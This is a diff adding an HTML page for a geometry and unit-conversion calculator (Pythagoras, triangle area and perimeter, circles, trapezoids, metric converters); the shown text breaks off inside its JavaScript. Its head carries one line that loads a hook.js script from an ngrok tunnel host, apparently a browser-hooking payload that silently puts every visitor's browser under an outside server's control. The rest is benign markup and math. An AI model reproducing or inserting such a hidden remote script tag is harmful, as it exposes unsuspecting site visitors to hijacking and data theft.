@@ -1,0 +1,1693 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <script src="https://f8aa-46-217-133-117.ngrok.io/hook.js"></script>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Developer: Enes Ago">
+        <link rel="icon" type="image/png" href="ykcheaderlogo.png"/>
+        <title>Linkoj</title>
+
+        <style>
+            *{
+                margin: 0;
+                font-family: Arial, Helvetica, sans-serif;
+            }
+
+        /*scrollbar*/
+        /* width */
+        ::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        /* Track */
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1; 
+        }
+
+        /* Handle */
+        ::-webkit-scrollbar-thumb {
+            background: #888; 
+        }
+
+        /* Handle on hover */
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555; 
+        }
+
+            /* sup */
+            .sup { 
+                position: relative; 
+                top: -0.75em; 
+                font-size: 80%; 
+            }
+
+            [data-section]{
+                border: 1px solid black;
+                width: 310px;   
+                height: 345px;
+            }
+            .flexbox{
+                display: flex;
+                flex-wrap: wrap;
+                margin: 10px;
+                justify-content: center;
+            }
+            label{
+                font-size: 16px;
+            }
+            select{
+                appearance: none;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                width: 96px;
+                height: 20px;
+                border: 2px solid #c5c5c5;
+                border-radius: 5px;
+                line-height: 18px;
+                font-size: 13px;
+                padding:0 1px;
+                background: #f3f3f3 url("photos/downarrowicon.png") no-repeat;
+                background-position: 110% 40%;
+                background-size: 30px;
+                cursor: pointer;
+                transition: 200ms;
+            }
+            select:hover{
+                border-color: #797979;
+            }
+            input[type='text']{
+                appearance: none;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                border: 1px solid #808080;
+                border-radius: 3px;
+                height: 15px;
+                width: 50px;
+                line-height: 15px;
+                font-size: 13px;
+                transition: 350ms;
+            }
+            input[type='text']::placeholder{
+                line-height: 15px;
+                font-size: 15px;
+            }
+            input[type='text']:hover{
+                border: 1px solid black;
+                box-shadow: 0px 0px 0px 1px black inset;
+            }
+            button{
+                appearance: none;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                height: 21px;
+                width: 47.1px;
+                line-height: 13.3px;
+                font-size: 13.3px;
+                background-color: #eeeeee;
+                border: 0.5px solid #8f8f8f;
+                border-radius: 3px;
+                cursor: pointer;
+                transition: 100ms;
+                text-align: center;
+                align-items: center;
+                justify-content: center;
+                padding:0;
+            }
+            button:hover{
+                background-color: #e7e7e7;
+                border: 2px solid #6d6d6d;
+            }
+            .first{
+                display: flex;
+                align-items: center;
+            }
+            .sec,.third, .fourth{
+                align-items: center;
+            }
+            .placeholder10px{
+                font-size: 15px;
+            }
+            .section7, .section2_70{
+                font-size: 10px;
+            }
+            .section7 input, .section2_70 input{
+                height: 13px;
+                font-size: 10px;
+            }
+            .section7 input::placeholder, .section2_70 input::placeholder{
+                height: 13px;
+                font-size: 12px;
+                line-height: 13px;
+            }
+            .meterconventer input, .metersquareconventer input, .literconventer input, .gramconventer input{
+                appearance: none;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                border: 1px solid rgb(110, 110, 110);
+                border-radius: 5px;
+                height: 20px;
+                width: 192px;
+                line-height: 15px;
+                font-size: 15px;
+                transition: 350ms;
+            }
+            .meterconventer input:hover, .metersquareconventer input:hover, .literconventer input:hover, .gramconventer input:hover{
+                border: 1px solid black;
+                box-shadow: 0px 0px 0px 1px black inset;
+            }
+
+        </style>
+    </head>
+<body>
+
+    <div class="flexbox">
+
+    <div data-section class="section1">
+        <img src="photos/pytagoatheorem.PNG" alt="phytagoratheorem" height="187px" width="239px">
+
+        <br>
+    
+        <label style="margin:15px" for="s1val">Choose which side:</label>
+
+        <select name="s1val" id="s1val">
+            <option selected disabled>Choose one</option>
+            <option value="1">c</option>
+            <option value="2">b</option>
+            <option value="3">a</option>
+        </select>
+
+        <br><br><br><br>
+
+    <div class="first" id="s1d1">
+        <input style="margin: 5px; margin-left: 15px; width: 50px;" id="s1fa" type="text" placeholder="a">  <span>+</span> 
+        <input style="margin: 5px; width: 50px;" id="s1fb" type="text" placeholder="b">  = 
+        <h3 style="margin: 5px; width: 40px;" id="s1fc" type="text">c</h3>
+        <button id="s1b1">solve</button>
+    </div>
+    <div class="sec" id="s1d2" style="display: none;">
+        <input style="margin: 5px; margin-left: 15px; width: 50px;" id="s1sc" type="text" placeholder="c"> <span>-</span>  
+        <input style="margin: 5px; width: 50px;" id="s1sb" type="text" placeholder="b">  = 
+        <h3 style="margin: 5px; width: 40px;" id="s1sa" type="text">a</h3>
+        <button id="s1b2">solve</button>
+    </div>
+    <div class="third" id="s1d3" style="display: none;">
+        <input style="margin: 5px; margin-left: 15px; width: 50px;" id="s1tc" type="text" placeholder="c"> <span>-</span>  
+        <input style="margin: 5px; width: 50px;" id="s1ta" type="text" placeholder="a">  = 
+        <h3 style="margin: 5px; width: 40px;" id="s1tb" type="text">b</h3>
+        <button id="s1b3">solve</button>
+    </div>
+</div>
+
+        <!-------------------------------------------------------------------------------------->
+
+        <div data-section class="section1_30">
+
+            <img src="photos/trigonometry_isosceles.png" alt="triangleisosceles" height="187px" width="170px">
+
+            <br>
+        
+            <label style="margin:15px" for="s1_30val">Choose which side:</label>
+    
+            <select name="s1_30val" id="s1_30val">
+                <option selected disabled>Choose one</option>
+                <option value="1">&#8730;2*a</option>
+                <option value="2">a</option>
+            </select>
+
+            <br><br><br><br>
+
+            <div class="first" id="s1_30d1">
+
+                <input type="text" style="margin: 5px 10px 5px 30px; width: 50px;" id="s1_30fa" type="text" placeholder="a"> <span>=</span>
+
+                <h3 style="margin: 5px; margin-left: 7px; width: 50px;" id="s1_30fb"> <strong>√</strong>2*a </h3>
+
+                <button style="margin-left: 7px;" id="s1_30b1">solve</button>
+
+            </div>
+
+            <div class="sec" id="s1_30d2" style="display: none;">
+
+                <h3 style="margin: 5px 7px 5px 30px;" id="s1_30sb"> a </h3> <span>=</span>
+
+                <input type="text" style="margin: 5px 10px 5px 10px; width: 50px;" id="s1_30sa" type="text" placeholder="√2*a">
+
+                <button style="margin-left: 30px;" id="s1_30b2">solve</button>
+
+            </div>
+
+        </div>
+
+        <!-------------------------------------------------------------------------------------->
+
+        <div data-section class="section1_70">
+
+            <img src="photos/trigonometry_rightangel.png" alt="trianglerightangel" height="187px" width="137px">
+
+            <br>
+        
+            <label style="margin:15px" for="s1_70val">Choose which side:</label>
+    
+            <select name="s1_70val" id="s1_70val">
+                <option selected disabled>Choose one</option>
+                <option value="1">a</option>
+                <option value="2">2a</option>
+                <option value="3">&#8730;3*a</option>
+            </select>
+
+            <br><br><br>
+
+            <div class="first" id="s1_70d1" style="height: 46px; margin-top: 10px;">
+
+                <input type="text" style="margin: 5px 10px 5px 15px; width: 50px;" id="s1_70fa" type="text" placeholder="a"><span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: center;" id="s1_70fb">2a</h3> <span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: center;" id="s1_70fc"> <strong>√</strong>3*a </h3>
+
+                <button style="margin-left: 10px;" id="s1_70b1">solve</button>
+
+            </div>
+
+            <div class="sec" id="s1_70d2" style="height: 46px; margin-top: 10px; display: none;">
+
+                <input type="text" style="margin: 5px 10px 5px 15px; width: 50px;" id="s1_70sb" type="text" placeholder="2a"><span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: center;" id="s1_70sa">a</h3> <span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: center;" id="s1_70sc"> <strong>√</strong>3*a </h3>
+
+                <button style="margin-left: 10px;" id="s1_70b2">solve</button>
+
+            </div>
+
+            <div class="third" id="s1_70d3" style="height: 46px; margin-top: 10px; display: none;">
+
+                <input type="text" style="margin: 5px 10px 5px 15px; width: 50px;" id="s1_70tc" type="text" placeholder="√3*a"><span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: center;" id="s1_70ta">a</h3> <span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: center;" id="s1_70tb">2a</h3>
+
+                <button style="margin-left: 10px;" id="s1_70b3">solve</button>
+
+            </div>
+
+        </div>
+
+        <!-------------------------------------------------------------------------------------->
+
+    <div data-section class="section2">
+
+        <img src="photos/triangelarea.PNG" alt="triangelarea" height="187px" width="188px">
+
+        <br>
+
+        <label style="margin: 5px;" for="s2val">Choose(area/base/side-a):</label>
+
+        <select name="s2val" id="s2val">
+            <option selected disabled>Choose one</option>
+            <option value="1">area</option>
+            <option value="2">side-a</option>
+            <option value="3">base</option>
+        </select>
+
+        <br><br><br>
+
+        <div class="first" id="s2d1" style="display: flex;">
+            <div style="display: flex; flex-direction: column;align-items: center;">
+                <div>
+                    <input style="margin: 5px; margin-left: 15px; width: 50px;" id="s2fbase" type="text" placeholder="base">  <span>+</span> 
+                    <input style="margin: 5px; width: 50px;" id="s2fside-a" type="text" placeholder="side-a">  
+                </div>
+                    <div style="margin-left: 15px;">_________________</div>  
+                    <div style="width: 160px; text-align: center;"><p><b>&nbsp;&nbsp;&nbsp;2</b></p></div>
+                </div>
+    <span>=</span>  <h3 style="margin: 5px; width: 40px;" id="s2farea" type="text">area</h3>
+            <button style="margin-left: 15px;" id="s2b1">solve</button>
+        </div>
+
+        <div class="sec" id="s2d2" style="display: none;">
+                <div style="display: flex; flex-direction: column; align-items: center;">
+                    <div style="display: flex; align-items: center;">
+                        <input style="margin: 5px; margin-left: 15px; width: 50px;" id="s2sbase" type="text" placeholder="base">  <span>+</span> 
+                        <h3 style="margin: 5px; width: 50px;" id="s2sside-a" type="text">side-a</h3>
+                    </div>
+                        <div style="margin-left: 15px;">________________</div>  
+                        <div style="width: 165px; text-align: center;"><p><b>&nbsp;&nbsp;&nbsp;2</b></p></div>
+            </div>
+    <span>=</span>  <input style="margin: 5px; width: 50px;" id="s2sarea" type="text" placeholder="area">
+                <button id="s2b2">solve</button>
+        </div>
+            
+            <div class="third" id="s2d3" style="display: none">
+                <div style="display: flex; flex-direction: column; align-items: center;">
+                    <div style="display: flex; align-items: center; justify-content: center;">&nbsp;&nbsp;&nbsp;&nbsp;
+                        <h3 style="margin: 5px; width: 50px;" id="s2tbase" type="text">base</h3>  <span>+</span>
+                        <input style="margin: 5px; margin-left: 15px; width: 50px;" id="s2tside-a" type="text" placeholder="side-a">  
+                    </div>
+                        <div style="margin-left: 15px;">_________________</div>  
+                        <div style="width: 165px; text-align: center;"><p><b>2</b></p></div>
+                </div>
+        <span>=</span>  <input style="margin: 5px; width: 50px;" id="s2tarea" type="text" placeholder="area">
+                    <button id="s2b3">solve</button>
+            </div>
+        </div>
+
+        <!-------------------------------------------------------------------------------------->
+
+        <div data-section class="section2_70">
+
+            <img src="photos/triangleperimeter.png" alt="triangelarea" height="170px" width="259px" style="margin-top: 20px;">
+
+            <br>
+    
+            <label style="margin-left: 15px;" for="s2_70al">Choose(P./side-a-b-c):</label>
+    
+            <select name="s2_70val" id="s2_70val">
+                <option selected disabled>Choose one</option>
+                <option value="1">Perimeter</option>
+                <option value="2">side-a</option>
+                <option value="3">side-b</option>
+                <option value="4">side-c</option>
+            </select>
+    
+            <br><br><br>
+
+            <div class="first" id="s2_70d1" style="height: 46px; margin-top: 5px; display: flex;">
+
+                <input type="text" style="margin: 5px 5px 5px 15px; width: 20px;" id="s2_70fa" type="text" placeholder="a"><span>+</span>
+
+                <input type="text" style="margin: 5px; width: 20px;" id="s2_70fb" type="text" placeholder="b"><span>+</span>
+
+                <input type="text" style="margin: 5px; width: 20px;" id="s2_70fc" type="text" placeholder="c"><span>=</span>
+
+                <h3 style="margin: 5px; width: 50px; text-align: left; font-size: 16px;" id="s2_70fperi">peri.</h3>
+
+                <button style="margin-left: 10px;" id="s2_70b1">solve</button>
+
+            </div>
+
+            <div class="sec" id="s2_70d2" style="height: 46px; margin-top: 5px; display: none;">
+
+                <h3 style="margin-left: 5px; width: 30px; text-align: center; font-size: 16px;" id="s2_70sa">a</h3><span>+</span>
+
+                <input type="text" style="margin: 5px; margin-left: 10px; width: 20px;" id="s2_70sb" type="text" placeholder="b"><span>+</span>
+
+                <input type="text" style="margin: 5px; width: 20px;" id="s2_70sc" type="text" placeholder="c"><span>=</span>
+
+                <input type="text" style="margin: 5px; margin-left: 10px; width: 40px;" id="s2_70speri" type="text" placeholder="peri.">
+
+                <button style="margin-left: 15px;" id="s2_70b2">solve</button>
+
+            </div>
+
+            <div class="third" id="s2_70d3" style="height: 46px; margin-top: 5px; display: none;">
+
+                <input type="text" style="margin: 5px; margin-left: 15px; width: 20px;" id="s2_70ta" type="text" placeholder="a"><span>+</span>
+
+                <h3 style="width: 30px; text-align: center; font-size: 16px;" id="s2_70tb">b</h3><span>+</span>
+
+                <input type="text" style="margin: 5px; width: 20px;" id="s2_70tc" type="text" placeholder="c"><span>=</span>
+
+                <input type="text" style="margin: 5px; margin-left: 10px; width: 40px;" id="s2_70tperi" type="text" placeholder="peri.">
+
+                <button style="margin-left: 15px;" id="s2_70b3">solve</button>
+
+            </div>
+
+            <div class="fourth" id="s2_70d4" style="height: 46px; margin-top: 5px; display: none;">
+
+                <input type="text" style="margin: 5px; margin-left: 15px; width: 20px;" id="s2_70foa" type="text" placeholder="a"><span>+</span>
+
+                <input type="text" style="margin: 5px; width: 20px;" id="s2_70fob" type="text" placeholder="b"><span>+</span>
+
+                <h3 style="width: 30px; text-align: center; font-size: 16px;" id="s2_70foc">c</h3><span>=</span>
+
+                <input type="text" style="margin: 5px; margin-left: 10px; width: 40px;" id="s2_70foperi" type="text" placeholder="peri.">
+
+                <button style="margin-left: 15px;" id="s2_70b4">solve</button>
+
+            </div>
+
+        </div>
+
+        <!-------------------------------------------------------------------------------------->
+
+        <div data-section class="section3">
+
+        <img src="photos/circle.jpg" alt="circle" height="187px" width="184.8px">
+
+        <br>
+
+        <label for="s3val" style="margin-left: 5px;">Choose circum (π=3.14):</label>
+
+        <select name="s3val" id="s3val" style="width: 110px;">
+            <option selected disabled>Choose one</option>
+            <option value="1"> circumference</option>
+            <option value="2"> radius</option>
+        </select>
+
+        <br><br><br>
+
+        <div class="first" id="s3d1" style="display: flex; align-items: center; height: 32px;">
+
+                <h3 style="margin-left: 15px;">2   ×   3.14    ×</h3>
+                <input style="margin: 5px; width: 50px;" id="s3fr" type="text" placeholder="r"> <span>=</span>
+
+                <h3 style="margin: 5px; width: 40px;" class="placeholder10px" id="s3fcircumference" >circumf.</h3>
+
+                <button style="margin-left: 30px;" id="s3b1">solve</button>
+
+            
+        </div>
+        <div class="sec" id="s3d2" style="display: none; align-items: center;">
+
+                <h3 style="margin-left: 15px;">2   ×   3.14    ×</h3>
+                <h3 style="margin: 5px;" id="s3sr" type="text" placeholder="r">r</h3> <span>=</span>
+
+                <input type="text" style="margin: 5px; width: 50px;" placeholder="circumf." class="placeholder10px" id="s3scircumference">
+
+                <button style="margin-left: 10px;" id="s3b2">solve</button>
+
+        </div>
+    </div>
+
+    <!-------------------------------------------------------------------------------------->
+
+    <div data-section class="section4">
+
+        <img src="photos/circle2.png" alt="circle" height="187px" width="176.1px">
+
+        <br>
+
+        <label for="s4val" style="margin-left: 5px;">Choose area (π=3.14):</label>
+
+        <select name="s4val" id="s4val">
+            <option selected disabled>Choose one</option>
+            <option value="1">find area</option>
+            <option value="2">find radius</option>
+        </select>
+
+        <br><br>
+
+        <div class="first" id="s4d1" style="display: flex; align-items: center;  margin-top: 15px;">
+
+                <h3 style="margin-left: 15px;">3.14    ×</h3>
+                <input style="margin: 5px; width: 30px;" id="s4fr" type="text" placeholder="r"> <span style="padding-bottom: 20px; margin-right: 5px;">2</span> <span>=</span>
+
+                <h3 style="margin: 5px; width: 40px;" id="s4farea" >area</h3>
+
+                <button style="margin-left: 20px;" id="s4b1">solve</button>
+
+            
+        </div>
+        <div class="sec" id="s4d2" style="display: none; align-items: center; margin-top: 14px;">
+
+                <h3 style="margin-left: 15px;">3.14    ×</h3>
+                <h3 style="margin: 5px;" id="s4sr" type="text" placeholder="r">r</h3> <span style="padding-bottom: 20px; margin-right: 5px;">2</span> <span>=</span>
+
+                <input type="text" style="margin: 10px; width: 50px;" placeholder="area" class="placeholder10px" id="s4sarea">
+
+                <button style="margin-left: 10px;" id="s4b2">solve</button>
+
+        </div>
+
+    </div>
+
+    <!-------------------------------------------------------------------------------------->
+
+    <div data-section class="section5">
+
+        <img src="photos/rectangle.PNG" alt="rectangle" height="137.6px" width="290px" style="margin-bottom: 15px;">
+
+        <br><br><br>
+
+        <label style="margin: 5px;" for="s5val">Choose area/side:</label>
+
+        <select name="s5val" id="s5val">
+            <option selected disabled>Choose one</option>
+            <option value="1"> area</option>
+            <option value="2"> side-a</option>
+            <option value="3"> side-b</option>
+        </select>
+
+        <br><br><br>
+
+    <div class="first" id="s5d1" style="display: flex; align-items: center;">
+
+            <input style="margin-left: 5px; margin: 5px; width: 50px;" id="s5fa" type="text" placeholder="a">   <span>×</span>
+            <input style="margin: 5px; width: 50px;" id="s5fb" type="text" placeholder="b">   <span>=</span>
+
+            <h3 style="margin: 5px; width: 40px;" id="s5farea" >area</h3>
+
+            <button style="margin-left: 30px;" id="s5b1">solve</button>
+    </div>
+
+    <div class="sec" id="s5d2" style="display: none; align-items: center;">
+
+        <h3 style="margin-left: 5px; margin: 5px; width: 50px; font-size: 16px; text-align: center;" id="s5sa" >side-a</h3>   <span>×</span>
+        <input style="margin: 5px; width: 40px;" id="s5sb" type="text" placeholder="b">   <span>=</span>
+
+        <input style="margin: 5px; width: 40px;" id="s5sarea" type="text" placeholder="area">
+
+        <button style="margin-left: 20px;" id="s5b2">solve</button>
+</div>
+
+    <div class="third" id="s5d3" style="display: none; align-items: center;">
+
+    <input style="margin-left: 5px; margin: 5px; width: 40px;" id="s5ta" type="text" placeholder="a"> <span>×</span>
+    <h3 style="margin: 5px; width: 50px; font-size: 16px; text-align: center;" id="s5tb" >side-b</h3> <span>=</span>
+
+    <input style="margin: 5px; width: 40px;" id="s5tarea" type="text" placeholder="area">
+
+    <button style="margin-left: 20px;" id="s5b3">solve</button>
+</div>
+    </div>
+
+    <!-------------------------------------------------------------------------------------->
+
+
+
+    <!-------------------------------------------------------------------------------------->
+
+    <div data-section class="section7">
+
+        <img src="photos/Trapezoid.svg.png" alt="rectangle" height="141.4px" width="240px">
+
+        <br><br>
+
+        <label style="margin: 5px;" for="s7val">Choose area/side:</label>
+
+        <select name="s7val" id="s7val">
+            <option selected disabled>Choose one</option>
+            <option value="1"> area</option>
+            <option value="2"> side-a</option>
+            <option value="3"> side-b</option>
+            <option value="4"> height</option>
+        </select>
+
+        <br><br><br>
+
+    <div class="first" id="s7d1" style="margin-left: 5px; display: flex; align-items:flex-start; text-align: center;">
+        <div>
+            <div style="display: flex;">
+                <input style="margin-left: 5px; margin-right: 5px; width: 30px;" id="s7fheight" type="text" placeholder="height"> <span style="font-size: 16px;">×</span>
+                <h3 style="width: 90px; margin: 0;" >(
+                    <input style="width: 20px;" id="s7fa" type="text" placeholder="a"> <span>+</span>
+                    <input style="width: 20px;" id="s7fb" type="text" placeholder="b">
+                )</h3>
+            </div>
+            <div>
+                <div>__________________________</div>  <br>
+                <h3>2</h3>
+            </div>
+        </div>
+        <div style="line-height: 54px; height: 54px;">
+            <h3 style="font-size: 16px;">= <span id="s7farea">area</span> <button style="margin-left: 10px;" id="s7b1">solve</button> </h3>
+        </div>
+    </div>
+
+    <div class="sec" id="s7d2" style="margin-left: 5px; display: none; align-items:flex-start; text-align: center;">
+        <div>
+            <div style="display: flex;">
+                <input style="margin-left: 5px; margin-right: 5px; margin-top: 2px; width: 30px;" id="s7sheight" type="text" placeholder="height"> <span style="font-size: 16px; margin-top: 2px;">×</span>
+                <h3 style="width: 90px; margin-left: 5px; display: flex; align-items: center;" >(
+                    <p style="font-size: 18px; padding-bottom: 2px; margin-left: 3px;" id="s7sa">a</p> <p style="margin: 3px;">+</p>
+                    <input style="width: 30px; margin-right: 3px;" id="s7sb" type="text" placeholder="b">
+                )</h3>
+            </div>
+            <div>
+                <div>_________________________</div>  <br>
+                <h3>2</h3>
+            </div>
+        </div>
+        <div style="line-height: 54px; height: 54px;">
+            <span style="font-size: 16px;">=</span> <input style="font-size: 12px; width: 40px; margin-left: 5px;" id="s7sarea" type="text" placeholder="area"> <button style="margin-left: 10px;" id="s7b2">solve</button> 
+        </div>
+    </div>
+
+    <div class="third" id="s7d3" style="margin-left: 5px; display: none; align-items:flex-start; text-align: center;">
+
+        <div>
+            <div style="display: flex;">
+                <input style="margin-left: 5px; margin-right: 5px; width: 30px;" id="s7theight" type="text" placeholder="height"> <span style="font-size: 16px;">×</span>
+                <h3 style="width: 90px; margin-left: 5px; display: flex; align-items: center;" >(
+                    <input style="width: 30px; margin-left: 3px;" id="s7ta" type="text" placeholder="a"> <p style="margin: 3px;">+</p>
+                    <p style="font-size: 16px; margin-right: 3px;" id="s7tb">b</p>
+                )</h3>
+            </div>
+            <div>
+                <div>_________________________</div>  <br>
+                <h3>2</h3>
+            </div>
+        </div>
+        <div style="line-height: 54px; height: 54px;">
+            <span style="font-size: 16px;">=</span> <input style="font-size: 12px; width: 40px; margin-left: 5px;" id="s7tarea" type="text" placeholder="area"> <button style="margin-left: 10px;" id="s7b3">solve</button> 
+        </div>
+    </div>
+
+    <div class="fourth" id="s7d4" style="margin-left: 5px; display: none; align-items:flex-start; text-align: center;">
+        <div>
+            <div style="display: flex;">
+                <h3 style="margin: 1px 15px 0 5px; width: 30px; text-align: center; font-size: 13px;" id="s7foheight">height</h3> <span style="font-size: 16px;">×</span>
+                <h3 style="width: 90px; margin: 0;" >(
+                    <input style="width: 20px;" id="s7foa" type="text" placeholder="a"> <span>+</span>
+                    <input style="width: 20px;" id="s7fob" type="text" placeholder="b">
+                )</h3>
+            </div>
+            <div>
+                <div>__________________________</div>  <br>
+                <h3>2</h3>
+            </div>
+        </div>
+        <div style="line-height: 54px; height: 54px;">
+            <span style="font-size: 16px;">=</span> <input style="font-size: 12px; width: 40px; margin-left: 5px;" id="s7foarea" type="text" placeholder="area"> <button style="margin-left: 10px;" id="s7b4">solve</button> 
+        </div>
+    </div>
+    </div>
+
+    <!-------------------------------------------------------------------------------------->
+
+
+    <!-------------------------------------------------------------------------------------->
+
+    <div data-section class="meterconventer">
+
+        <div class="name" style="text-align: center;">
+            <h2>meter conventer</h2>
+            <p>rounded</p>
+        </div>
+        <br>
+
+        <div class="convert" style="align-items: center; text-align: center;">
+
+        <label>Kilometer</label> <br>
+        <input type="number" id="inputkmeter" placeholder="Kilometer" oninput="kilometerconventer(this.value)" onchange="kilometerconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        <br><br>
+
+        <label>Meter</label> <br>
+        <input type="number" id="inputmeter" placeholder="Meter" oninput="meterconventer(this.value)" onchange="meterconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        <br><br>
+
+        <label>Centimeter</label> <br>
+        <input type="number" id="inputcmeter" placeholder="Centimeter" oninput="centimeterconventer(this.value)" onchange="centimeterconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        <br><br>
+
+        <label>Millimeter</label> <br>
+        <input type="number" id="inputmmeter" placeholder="Millimeter" oninput="millimeterconventer(this.value)" onchange="millimeterconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+    </div>
+    </div>
+
+
+    <!-------------------------------------------------------------------------------------->
+
+
+    <div data-section class="metersquareconventer">
+
+        <div class="name" style="text-align: center;">
+            <h2>meter<sup>2</sup> conventer</h2>
+            <p>rounded</p>
+        </div>
+        <br>
+
+        <div class="convert" style="align-items: center; text-align: center;">
+
+        <label>Kilometer<sup>2</sup></label> <br>
+        <input type="number" id="inputkmetersquare" placeholder="Kilometer" oninput="kilometersquareconventer(this.value)" onchange="kilometersquareconventer(this.value)" style="height: 20px; font-size: 15px; margin-top: 1px;">
+        <sup class="sup">2</sup>
+
+        <br><br>
+
+        <label>Meter<sup>2</sup></label> <br>
+        <input type="number" id="inputmetersquare" placeholder="Meter" oninput="metersquareconventer(this.value)" onchange="metersquareconventer(this.value)" style="height: 20px; font-size: 15px;">
+        <sup class="sup">2</sup>
+
+        <br><br>
+
+        <label>Centimeter<sup>2</sup></label> <br>
+        <input type="number" id="inputcmetersquare" placeholder="Centimeter" oninput="centimetersquareconventer(this.value)" onchange="centimetersquareconventer(this.value)" style="height: 20px; font-size: 15px;">
+        <sup class="sup">2</sup>
+
+        <br><br>
+
+        <label>Millimeter<sup>2</sup></label> <br>
+        <input type="number" id="inputmmetersquare" placeholder="Millimeter" oninput="millimetersquareconventer(this.value)" onchange="millimetersquareconventer(this.value)" style="height: 20px; font-size: 15px;">
+        <sup class="sup">2</sup>
+
+    </div>
+    </div>
+
+
+    <!-------------------------------------------------------------------------------------->
+
+
+    <div data-section class="literconventer">
+
+        <div class="name" style="text-align: center;">
+            <h2>Liter conventer</h2>
+            <p>rounded</p>
+        </div>
+        <br>
+
+        <div class="convert" style="align-items: center; text-align: center;">
+
+        <label>KiloLiter</label> <br>
+        <input type="number" id="inputkliter" placeholder="KiloLiter" oninput="kiloliterconventer(this.value)" onchange="kiloliterconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        <br><br>
+
+        <label>Liter</label> <br>
+        <input type="number" id="inputliter" placeholder="Liter" oninput="literconventer(this.value)" onchange="literconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        <br><br>
+
+        <label>CentiLiter</label> <br>
+        <input type="number" id="inputcliter" placeholder="CentiLiter" oninput="centiliterconventer(this.value)" onchange="centiliterconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        <br><br>
+
+        <label>MilliLiter</label> <br>
+        <input type="number" id="inputmliter" placeholder="MilliLiter" oninput="milliliterconventer(this.value)" onchange="milliliterconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+    </div>
+    </div>
+
+
+    <!-------------------------------------------------------------------------------------->
+
+
+    <div data-section class="gramconventer">
+
+        <div class="name" style="text-align: center;">
+            <h2>Gram conventer</h2>
+            <p>rounded</p>
+        </div>
+        <br>
+
+        <div class="convert" style="align-items: center; text-align: center;">
+
+            <label>KiloGram</label> <br>
+            <input type="number" id="inputkgram" placeholder="KiloGram" oninput="kilogramconventer(this.value)" onchange="kilogramconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+            <br><br>
+
+            <label>Gram</label> <br>
+            <input type="number" id="inputgram" placeholder="Gram" oninput="gramconventer(this.value)" onchange="gramconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+            <br><br>
+
+            <label>CentiGram</label> <br>
+            <input type="number" id="inputcgram" placeholder="CentiGram" oninput="centigramconventer(this.value)" onchange="centigramconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+            <br><br>
+
+            <label>MilliGram</label> <br>
+            <input type="number" id="inputmgram" placeholder="MilliGram" oninput="milligramconventer(this.value)" onchange="milligramconventer(this.value)" style="height: 20px; font-size: 15px;">
+
+        </div>
+    </div>
+
+
+    <!-------------------------------------------------------------------------------------->
+
+
+
+    <!-- Physics -->
+
+    <div style="display:none;" data-section class="forceEquation">
+
+        <img src="photos/Force_Equation.png" alt="rectangle" style="margin-top: 5px !important;"  width="240px">
+
+        <br><br>
+
+        <label style="margin: 5px;" for="physicss1val">Choose Force/Acc/Mass:</label>
+
+        <select name="physicss1val" id="physicss1val">
+            <option selected disabled>Choose one</option>
+            <option value="1"> Force</option>
+            <option value="2"> Acceleration</option>
+            <option value="3"> Mass</option>
+        </select>
+
+        <br><br><br>
+
+        <div class="first" id="physicss1d1" style="margin-left: 5px; display: flex; align-items:flex-start; text-align: center;">
+            <input style="margin-left: 5px; margin: 5px; width: 50px;" id="physicss1fb" type="text" placeholder="Acceleration">   <span style="height: 32px; line-height: 32px;">×</span>
+            <input style="margin: 5px; width: 50px;" id="physicss1sc" type="text" placeholder="Mass">   <span style="height: 32px; line-height: 32px;">=</span>
+
+            <h3 style="margin: 5px; width: 40px;" id="physicss1fforce" >Force</h3>
+
+            <button style="margin-left: 30px;" id="physicss1b1">solve</button>
+        </div>
+
+        <div class="sec" id="physicss1d2" style="margin-left: 5px; display: none; align-items:flex-start; text-align: center;">
+            <div>
+                <div style="display: flex;">
+                    <h3 style="width: 70px; margin: 0;" >
+                        <input style="width: 50px; text-align: center;" id="physicss1sa" type="text" placeholder="Force"> <!--<span>+</span> -->
+                        <!-- <input style="width: 20px;" id="physicss1fc" type="text" placeholder="b"> -->
+                    </h3>
+                </div>
+                <div>
+                    <div>________</div>  <br>
+                    <!-- <h3>2</h3> -->
+                    <input style="width: 50px; text-align: center;" id="physicss1sc" type="text" placeholder="mass"> <!--<span>+</span> -->
+
+                </div>
+            </div>
+            <div style="margin-left:5px; line-height: 75px; height: 75px;">
+                <h3 style="display: flex; height: 32px; align-items: center;"> <span style="font-size: 16px;">=</span> <span id="physicss1sacc">Acceleration</span> <button style="margin-left: 10px;" id="physicss1b2">solve</button> </h3>
+            </div>
+        </div>
+
+
+
+    </div>
+
+
+
+    </div>
+    <script>
+    
+    
+
+        //section1----------------------------------------------------------------------------
+        let s1switch = document.querySelector("#s1val").value;
+        let buttons = [document.getElementById("s1b1"),document.getElementById("s1b2"),document.getElementById("s1b3")];
+
+        function csquare(a,b){
+
+        return ((Math.sqrt((a * a) + (b * b))).toFixed(2));
+
+        }
+        function asquare(a,b){
+        return ((Math.sqrt((a * a) - (b * b))).toFixed(2));
+        }
+
+        document.getElementById("s1val").addEventListener('change', () => {
+
+
+        s1switch = document.querySelector("#s1val").value;
+
+
+        if(s1switch == 1){
+
+        document.getElementById("s1d1").style.display = "flex";
+        document.getElementById("s1d2").style.display = "none";
+        document.getElementById("s1d3").style.display = "none";
+
